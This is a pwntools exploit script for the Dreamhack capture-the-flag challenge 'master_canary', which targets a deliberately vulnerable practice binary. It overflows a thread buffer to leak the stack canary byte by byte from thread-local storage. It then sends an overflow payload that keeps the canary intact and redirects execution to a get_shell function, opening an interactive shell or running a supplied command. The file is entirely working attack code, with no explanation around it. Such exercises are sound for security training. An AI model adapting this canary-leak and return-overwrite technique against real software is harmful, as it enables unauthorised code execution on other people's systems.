from pwn import *
import time


BIN = args.BIN or "./master_canary"
elf = ELF(BIN)

context.binary = elf
context.log_level = args.LOG or "info"

MENU = b"1. Create thread\n2. Input\n3. Exit\n"

# Ubuntu 16.04 challenge Docker offset. On the current host glibc, use OFFSET=0x938.
TLS_CANARY_OFFSET = int(args.OFFSET or ("0x8e8" if args.REMOTE or args.DOCKER else "0x938"), 0)
MAIN_CANARY_OFFSET = 0x28


def start():
    if args.REMOTE:
        host = args.HOST or "host3.dreamhack.games"
        port = int(args.PORT or 0)
        if port == 0:
            log.error("set PORT=<challenge port>")
        return remote(host, port)

    if args.DOCKER:
        return process(
            [
                "docker",
                "run",
                "-i",
                "--rm",
                "--user",
                "master_canary",
                "master_canary_local",
                "/home/master_canary/master_canary",
            ]
        )

    return process(BIN)


def leak_suffix(p, known_len):
    size = TLS_CANARY_OFFSET + known_len

    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", b"A" * size)

    out = p.recvuntil(MENU)
    marker = out.find(b"Data: ")
    if marker < 0:
        log.error("failed to find leak marker")

    printed = out[marker + 6 : -len(MENU)]
    return printed[size:]


def leak_canary(p):
    known = bytearray(b"\x00")

    while len(known) < 8:
        suffix = leak_suffix(p, len(known))
        need = 8 - len(known)
        take = suffix[:need]

        known.extend(take)
        if len(take) < need:
            known.append(0)

    return bytes(known[:8])


def main():
    p = start()

    p.sendlineafter(b"> ", b"1")
    canary = leak_canary(p)
    log.success("canary: %#x", u64(canary))

    payload = b"A" * MAIN_CANARY_OFFSET
    payload += canary
    payload += b"B" * 8
    payload += p64(elf.symbols["get_shell"])

    p.sendlineafter(b"> ", b"3")
    p.recvuntil(b"Leave comment: ")
    p.sendline(payload)

    if args.CMD:
        time.sleep(0.2)
        p.sendline(args.CMD.encode())
        print(p.recvrepeat(1).decode("latin-1", errors="replace"), end="")
    else:
        p.interactive()


if __name__ == "__main__":
    main()
